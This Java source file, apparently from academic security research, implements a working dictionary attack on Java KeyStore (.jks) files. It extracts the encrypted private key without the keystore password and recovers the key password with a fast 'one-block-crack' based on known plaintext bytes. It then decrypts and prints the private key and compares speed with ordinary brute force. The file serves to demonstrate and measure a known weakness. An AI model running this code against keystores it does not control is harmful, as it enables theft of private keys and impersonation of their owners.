import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.security.Key;
import java.security.KeyStoreException;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.UnrecoverableKeyException;
import java.security.cert.CertificateException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Arrays;
import java.util.List;

import javax.crypto.EncryptedPrivateKeyInfo;
import javax.swing.KeyStroke;
import javax.swing.JComboBox.KeySelectionManager;


/**

@author: Bernhard Brenner, SBA Research <bbrenner@sba-research.org>
Date: May 2018

*/


public class TestJKSCrack {

	private Logger log = Logger.getInstance();
	private HashMap<Integer, byte[]> knownPlaintextsMap = new HashMap<Integer, byte[]>();
	private long tConsFast=0;
	private long tConsSlow=0;
	
	
	private void init() {
		// 512 bit and 768 bit keys
		byte[] temp = { (byte) 0x30, (byte) 0x82, (byte) 0x01 };
		for (int i = 360; i < 540; ++i) {
			knownPlaintextsMap.put(i, temp);
		}

		// 1024 bit keys
		byte[] temp2 = { (byte) 0x30, (byte) 0x82, (byte) 0x02 };
		for (int i = 650; i < 700; ++i) {
			knownPlaintextsMap.put(i, temp2);
		}

		// 2048 bit keys
		byte[] temp3 = { (byte) 0x30, (byte) 0x82, (byte) 0x04 };
		for (int i = 1245; i < 1265; ++i) {
			knownPlaintextsMap.put(i, temp3);
		}

		// 4094 bit keys
		byte[] temp4={(byte)0x30,(byte)0x82,(byte)0x09};
		for (int i = 2360; i < 2470; ++i) {
			knownPlaintextsMap.put(i, temp4);
		}

		// 8192 bit keys
		byte[] temp5={(byte)0x30,(byte)0x82,(byte)0x12};
		for (int i = 4650; i < 4780; ++i) {
			knownPlaintextsMap.put(i, temp5);
		}

	}

	public TestJKSCrack() {
		init();
	}

	/**
	 * Method from
	 * Stackexchange.com:https://stackoverflow.com/questions/9655181/how-to-convert-a-byte-array-to-a-hex-string-in-java
	 * (30.4.2018)
	 */
	private final static char[] hexArray = "0123456789ABCDEF".toCharArray();

	public String byteArrtoHexString(byte[] bytes) {
		char[] hexChars = new char[bytes.length * 2];
		for (int j = 0; j < bytes.length; j++) {
			int v = bytes[j] & 0xFF;
			hexChars[j * 2] = hexArray[v >>> 4];
			hexChars[j * 2 + 1] = hexArray[v & 0x0F];
		}
		return new String(hexChars);
	}

	public byte[] getKeyFromFile(String path, String alias, String password, String keyStorePassword)
			throws KeyStoreException, NoSuchAlgorithmException, CertificateException, IOException,
			UnrecoverableKeyException {
		REJKS keyStore = null;

		keyStore = new REJKS();

		char[] keyStorePasswordCharArr = keyStorePassword.toCharArray();
		char[] privKeyPassword = password.toCharArray();
		InputStream keyStoreData = null;

		keyStoreData = new FileInputStream(path);

		keyStore.engineLoad(keyStoreData, keyStorePasswordCharArr);

		Key privateKeyEntry = null;
		privateKeyEntry = keyStore.engineGetKey(alias, privKeyPassword);

		byte[] keyMaterial = privateKeyEntry.getEncoded();
		return keyMaterial;

	}

	/**
	 * This method does not even need the keystorepassword to open the keystore.
	 * Thanks to: Casey Marshall (rsdio@metastatic.org)
	 * http://metastatic.org/source/JKS.java
	 * 
	 * It fetches the encrypted KeyStore from the *.jks file into a Java KeyStore
	 * Object and returns this object.
	 * 
	 * @param keyStorePassword
	 * @param keyPassword
	 * @param path
	 * @return
	 * @throws UnrecoverableKeyException
	 */
	public REJKS fetchEncryptedKeyStore(String keyStorePassword, String path) throws UnrecoverableKeyException {
		REJKS keyStore = new REJKS();

		char[] keyStorePasswordCharArr = keyStorePassword.toCharArray();
		InputStream keyStoreData = null;

		try {
			keyStoreData = new FileInputStream(path);
		} catch (FileNotFoundException e1) {

			throw new UnrecoverableKeyException(e1.getMessage());
		}

		try {
			keyStore.engineLoad(keyStoreData, keyStorePasswordCharArr);
		} catch (NoSuchAlgorithmException | CertificateException | IOException e) {

			throw new UnrecoverableKeyException(e.getMessage());
		}

		return keyStore;
	}

	/**
	 * This is an implementation of "Algorithm-1" from the paper.
	 * 
	 * Note: -E1 is equal to the first 20 byte block of E. -temp is equal to the
	 * known plaintext bytes (i.e. the first three bytes) for all X bit RSA Keys.
	 * -W1 is a 20 byte Block and equals h(password || salt), where h is sha1 and
	 * password is the password of the current attempt. -A password guess is correct
	 * iff the first three bytes of W1 are equal to the test_bytes (with a
	 * probability of a false positive of 2^-24)
	 * 
	 * @param E
	 *            The whole encrypted bytestring of the key, including checksum and
	 *            salt. This is what you get from REJKS.getEncryptedPrivKey(String
	 *            alias).
	 * @param salt
	 *            The salt (extracted from E)
	 * @param CK
	 *            The Checksum (it is equal to the last 20 byte block in E)
	 * @return The correct password if found. Null otherwise.
	 * @throws FailedToCrackException
	 */
	public String oneBlockCrack(byte[] salt, byte[] E, byte[] CK, String[] passwords) throws FailedToCrackException {
		byte[] E1 = new byte[20];
		System.arraycopy(E, 20, E1, 0, E1.length);

		log.INFO("E1 is: " + byteArrtoHexString(E1));

		byte[] temp = knownPlaintextsMap.get(E.length);
		log.INFO("test_bytes is: " + byteArrtoHexString(temp));
		byte[] test_bytes = byteWiseXOR(temp, E1);
		log.INFO("test_bytes (after XOR with E1) is: " + byteArrtoHexString(test_bytes));

		MessageDigest sha;
		try {
			sha = MessageDigest.getInstance("SHA1");
		} catch (NoSuchAlgorithmException e1) {
			throw new FailedToCrackException("SHA1 not supported");
		}
		int count = 0;
		byte[] W1 = null;
		int attempts = 0;

		long tA = System.currentTimeMillis();

		for (String password : passwords) {
			sha.reset();
			sha.update(charsToBytes(password.toCharArray()));
			sha.update(salt);
			W1 = sha.digest();

			attempts++;
			if (compareBytes(test_bytes, W1)) {
				try{
					if (REJKS.passwordCheckWithChecksum(E, REJKS.charsToBytes(password.toCharArray()))==false) {
						log.INFO("The seldom case of finding a wrong password has happened!");
						log.INFO("This is the wrong password producing the same first three bytes:" + password);
						log.INFO("Now going to continue search....");
						continue;
					}
				}catch(UnrecoverableKeyException e) {
					throw new FailedToCrackException(e.getMessage());
				}
				
				log.INFO("W1 was: " + byteArrtoHexString(W1));
				log.INFO("Number of Attempts: " + attempts);
				tConsFast = System.currentTimeMillis() - tA;
				log.INFO("Time consumed: " + (tConsFast) + " ms");

				log.INFO("Speed: " + (attempts / ((tConsFast / 1000) + 1)) + " attempts per second");
				return password;
			}

			
		}

		return null;

	}

	/**
	 * True if bytes of the shorter Array equal the first Bytes of the longer Array.
	 * The shorter array shall be placed in the first parameter.
	 */
	private boolean compareBytes(byte[] test_bytes, byte[] w1) {
		for (int i = 0; i < test_bytes.length; ++i) {
			if (w1[i] != test_bytes[i])
				return false;
		}
		return true;
	}

	private byte[] byteWiseXOR(byte[] a, byte[] b) {
		byte[] product = new byte[a.length];

		for (int i = 0; i < product.length; ++i) {
			product[i] = (byte) (a[i] ^ b[i]);
		}
		return product;
	}

	// Code from:
	// https://stackoverflow.com/questions/285712/java-reading-a-file-into-an-array
	public String[] pwListfromDictionary(String filename) throws IOException {
		FileReader fileReader = new FileReader(filename);
		BufferedReader bufferedReader = new BufferedReader(fileReader);
		List<String> lines = new ArrayList<String>();
		String line = null;
		while ((line = bufferedReader.readLine()) != null) {
			lines.add(line);
		}
		bufferedReader.close();
		return lines.toArray(new String[lines.size()]);
	}

	/**
	 * Code from REJKS.java
	 * 
	 * @param passwd
	 *            A char []
	 * @return The chars in byte format.
	 */
	public byte[] charsToBytes(char[] passwd) {
		byte[] buf = new byte[passwd.length * 2];
		for (int i = 0, j = 0; i < passwd.length; i++) {
			buf[j++] = (byte) (passwd[i] >>> 8);
			buf[j++] = (byte) passwd[i];
		}
		return buf;
	}

	public void runTest(String keystorefile, String alias, String dictionaryPath) {
		REJKS keyStore = null;
		try {
			keyStore = fetchEncryptedKeyStore("", keystorefile);
		} catch (UnrecoverableKeyException e1) {

			e1.printStackTrace();
		}

		byte[] privKey = null;
		try {

			byte[] checksum = null;
			byte[] encPrivKey = null;
			byte[] salt = null;

			encPrivKey = keyStore.getEncryptedPrivKey(alias);
			log.INFO("Extracted encrypted Private Key (without KeyStore-password)");

			byte[] encryptedPrivateKey = new EncryptedPrivateKeyInfo(encPrivKey).getEncryptedData();
			log.INFO(byteArrtoHexString(encryptedPrivateKey));

			log.INFO("Length is: " + encryptedPrivateKey.length + " bytes");
			checksum = keyStore.getCheckSum(encPrivKey);
			salt = keyStore.getSalt(encPrivKey);

			log.INFO("Salt: " + byteArrtoHexString(salt));
			log.INFO("Checksum: " + byteArrtoHexString(checksum));

			log.INFO("Loading Dictionary into RAM");
			String[] passwords = null;
			passwords = pwListfromDictionary(dictionaryPath);

			log.INFO("Performing one-block-crack");

			String correctPassword = oneBlockCrack(salt, encryptedPrivateKey, checksum, passwords);
			if (correctPassword == null)
				throw new FailedToCrackException("Password not in dictionary");
			log.INFO("Password is: " + correctPassword);

		
			try {
				
				byte[] kPlain = keyStore.decryptKey(encPrivKey, keyStore.charsToBytes(correctPassword.toCharArray()));
				log.INFO("Decrypted Private Key is: ");
				log.INFO(byteArrtoHexString(kPlain));
			}catch (UnrecoverableKeyException e) {
				log.FATAL("Error: Could not decrypt the Key. Something must have gone wrong.");
			}
			
			

			log.INFO("Comparing to conventional Brute-Force without optimization by Focardi et al..");
			log.INFO("Performing simple crack attempt");
			int attempts = 0;

			long tA = System.currentTimeMillis();
			for (String password : passwords) {
				attempts++;
				try {
					keyStore.decryptKey(encPrivKey, keyStore.charsToBytes(password.toCharArray()));
					log.INFO("Password is: " + password);
					break;
				} catch (Exception e) {
					continue;
				}
			}
			log.INFO("Number of Attempts: " + attempts);
			 tConsSlow = System.currentTimeMillis() - tA;
			log.INFO("Time consumed: " + (tConsSlow) + " ms");

			log.INFO("Speed: " + (attempts / ((tConsSlow / 1000) + 1)) + " attempts per second");
			
			log.INFO("Speed Comparison: ");
			log.INFO("One Block Crack was: " + (tConsSlow/(tConsFast+1)) +" times faster in this case");

		} catch (UnrecoverableKeyException e) {
			e.printStackTrace();
		} catch (FailedToCrackException e) {
			e.printStackTrace();
		} catch (IOException e) {
			e.printStackTrace();
		}

	}

}
